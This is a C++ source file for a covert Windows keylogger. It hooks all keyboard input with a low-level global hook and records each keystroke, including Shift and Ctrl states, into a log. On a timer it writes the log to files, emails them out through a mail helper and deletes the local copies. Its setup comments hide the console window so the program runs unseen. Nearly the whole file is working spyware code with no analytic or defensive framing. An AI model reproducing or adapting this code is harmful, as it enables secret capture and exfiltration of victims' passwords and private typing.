// Entry.cpp : Defines the entry point for the console application.
// Project- Console Application
// Properties -> Linker -> System, here change SubSystem to Windows
// Properties -> Configuration Properties -> General-> Character, here change to Not Set

#include <iostream>
#include "stdafx.h"
#include "InputOutup.h"
#include "Timer.h"
#include <fstream>
#include "windows.h"
#include "KeyMap.h"
#include "Timer.h"
#include "Mail.h"

#include <windows.h>
bool InstallHook();
void TimerSendMail();
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);
string keylog = "";
HHOOK eHook = NULL;
Timer MailTimer(TimerSendMail, 2000 * 6);
bool mailSend = 0; // 0 - mail wasn't send, 1 - send
int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR IpCmdLine, int nCmdShow) // to disable console icon
{
	MSG Msg;
	InputOutup inOut;
	inOut.getPath(true);
	InstallHook();
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);

	}
	MailTimer.Stop();
	return 0;
}

bool InstallHook()
{
	CurrentTimeDate currDate;
	currDate.writeAppLog("Hook started... Timer started");
	MailTimer.Start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);    // LL = short for "low level"
																									  // last parameter : DWORD = 0 (the hook procedure is associated with all existing threads running in the same desktop as the calling thread)
	return eHook == NULL;
}
// unhook all keyboard events from our process, rendering the keylogging process non-functional (it doesn't kill the keylogger, it just uninstalls the hook)

bool UnistallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool IsHooked()
{
	return (bool)(eHook == NULL);
}

void TimerSendMail()
{
	InputOutup inOut;
	CurrentTimeDate currDate;
	Mail eMail;
	
	if (keylog.empty())
	{
		if (!mailSend)
		{
			int y = eMail.sendMail("Log [AppData]", "The AppData file:\n", "AppLog.txt");
			if (y == 7)
			{
				mailSend = 1;
				inOut.deleteLog("AppLog.txt");
			}
		}
		return;
	}
	string last_file = inOut.WriteLog(keylog);
	if (last_file.empty())
	{
		currDate.writeAppLog("File creation was not successful. Keylog '" + keylog + "'");
		return;
	}
	int x = eMail.sendMail("Log [" + last_file + "]", "The file with log file\n", inOut.getPath(true) +  last_file);
	if (x != 7)  // if the mail sending has failed
	{
		currDate.writeAppLog("Mail was not sent! Error code: " + currDate.toString(x));
		currDate.writeAppLog(keylog);
		mailSend = 0;
	}
	else
	{
		if (!mailSend)
		{
			int y = eMail.sendMail("Log [AppData]", "The AppData file:\n", "AppLog.txt");
			if (y == 7)
			{
				mailSend = 1;
				inOut.deleteLog("AppLog.txt");
			}
		}
	}	
	inOut.deleteLog(inOut.getPath(true) + last_file);
	keylog = "";    // we "clear" it, there is no point in keeping that string anymore
	
}
// the following function can also be used to "forbid" keys from the keyboard, so when they are pressed, they are ineffective
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	KeyMap keys;
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // we check if someone has pressed a key (and not released it yet)
	{
		keylog += keys.getName(kbs);
		if (kbs->vkCode == VK_RETURN)    // if someone presses enter, it just goes to a new line, it doesn't log "enter"
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)    // if the keys' state is "up"
	{   // we have smth like [SHIFT][a][b][/SHIFT][c][d], so we know that [a],[b] are upper-case
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT
			|| key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK
			|| key == VK_LWIN || key == VK_RWIN)
		{

			std::string KeyName = keys.getName(kbs);
			KeyName.insert(1, "/"); // inserting the backslash for the e.g. [SHIFT]...[/SHIFT]
			keylog += KeyName;
		}
	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);    // we return it to the system
}